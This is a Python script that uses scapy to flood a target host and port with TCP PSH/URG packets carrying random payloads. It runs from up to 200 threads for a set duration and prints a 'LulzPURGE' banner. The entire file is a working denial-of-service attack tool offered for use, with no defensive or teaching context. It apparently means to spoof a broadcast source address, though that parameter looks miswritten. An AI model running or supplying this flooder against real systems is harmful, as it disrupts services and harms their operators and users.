import threading, sys, os, time
from random import randint
from scapy.all import *

def flood():
    host = sys.argv[2]
    port = sys.argv[3]
    duration = sys.argv[4]

    stoptime = time.time() + int(duration)
    while time.time() < stoptime:
        try:
            ip = IP(str="255.255.255.255", dst=host)
            tcp = TCP(sport=RandShort(), dport=int(port), flags="PU", seq=RandShort(), ack=RandShort())
            raw = Raw(os.urandom(randint(1024, 2048)))
            send(ip/tcp/raw, verbose=0)
        except KeyboardInterrupt:
            os.kill(os.getpid(), 9)
        except Exception:
            pass

if __name__ == '__main__':
    print('''
             /$$                 /$$           /$$$$$$$  /$$   /$$ /$$$$$$$   /$$$$$$  /$$$$$$$$
            | $$                | $$          | $$__  $$| $$  | $$| $$__  $$ /$$__  $$| $$_____/
            | $$       /$$   /$$| $$ /$$$$$$$$| $$  \ $$| $$  | $$| $$  \ $$| $$  \__/| $$      
            | $$      | $$  | $$| $$|____ /$$/| $$$$$$$/| $$  | $$| $$$$$$$/| $$ /$$$$| $$$$$   
            | $$      | $$  | $$| $$   /$$$$/ | $$____/ | $$  | $$| $$__  $$| $$|_  $$| $$__/   
            | $$      | $$  | $$| $$  /$$__/  | $$      | $$  | $$| $$  \ $$| $$  \ $$| $$      
            | $$$$$$$$|  $$$$$$/| $$ /$$$$$$$$| $$      |  $$$$$$/| $$  | $$|  $$$$$$/| $$$$$$$$
            |________/ \______/ |__/|________/|__/       \______/ |__/  |__/ \______/ |________/
    ''')

    try:
        threadcount = 200 if int(sys.argv[1]) > 200 else int(sys.argv[1])

        for _ in range(threadcount):
            threading.Thread(target=flood).start()
    except:
        print('error')